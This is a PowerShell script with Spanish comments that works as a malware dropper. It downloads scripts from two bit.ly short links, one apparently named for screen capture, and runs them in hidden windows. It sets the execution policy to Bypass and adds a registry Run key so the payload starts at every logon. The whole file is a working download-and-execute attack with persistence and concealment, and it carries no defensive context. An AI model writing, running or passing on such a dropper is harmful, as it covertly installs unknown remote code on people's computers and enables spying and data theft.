# URL del archivo a descargar y ejecutar
$scriptUrl = "https://bit.ly/3HVDrbb"

# Ruta donde se guardará el archivo descargado
$downloadedScriptPath = "$env:USERPROFILE\newFile.ps1"

# Descargar el archivo
Invoke-WebRequest -Uri $scriptUrl -OutFile $downloadedScriptPath

# Verificar si el archivo descargado existe
if (Test-Path $downloadedScriptPath) {
    # Ejecutar el script descargado de manera oculta
    Start-Process powershell.exe -ArgumentList "-NoNewWindow -WindowStyle Hidden -File `"$downloadedScriptPath`"" -WindowStyle Hidden
} else {
    Write-Host "El archivo '$downloadedScriptPath' no se encontró."
}

# Agregar entrada al Registro de Windows para ejecutar el script descargado al iniciar sesión
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "MyScript"
if (!(Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue)) {
    New-ItemProperty -Path $regPath -Name $regName -Value $downloadedScriptPath -PropertyType String -Force | Out-Null
}

# Verificar si el script principal ya existe
$mainScriptPath = "$env:USERPROFILE\sysw.ps1"
if (!(Test-Path $mainScriptPath)) {
    # Descargar el script principal
    $mainScriptUrl = "https://bit.ly/Screen_dc"
    Invoke-WebRequest -Uri $mainScriptUrl -OutFile $mainScriptPath
}

# Establecer la política de ejecución para el script principal
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

# Ejecutar el script principal de manera oculta
Start-Process powershell.exe -ArgumentList "-NoNewWindow -WindowStyle Hidden -File `"$mainScriptPath`"" -WindowStyle Hidden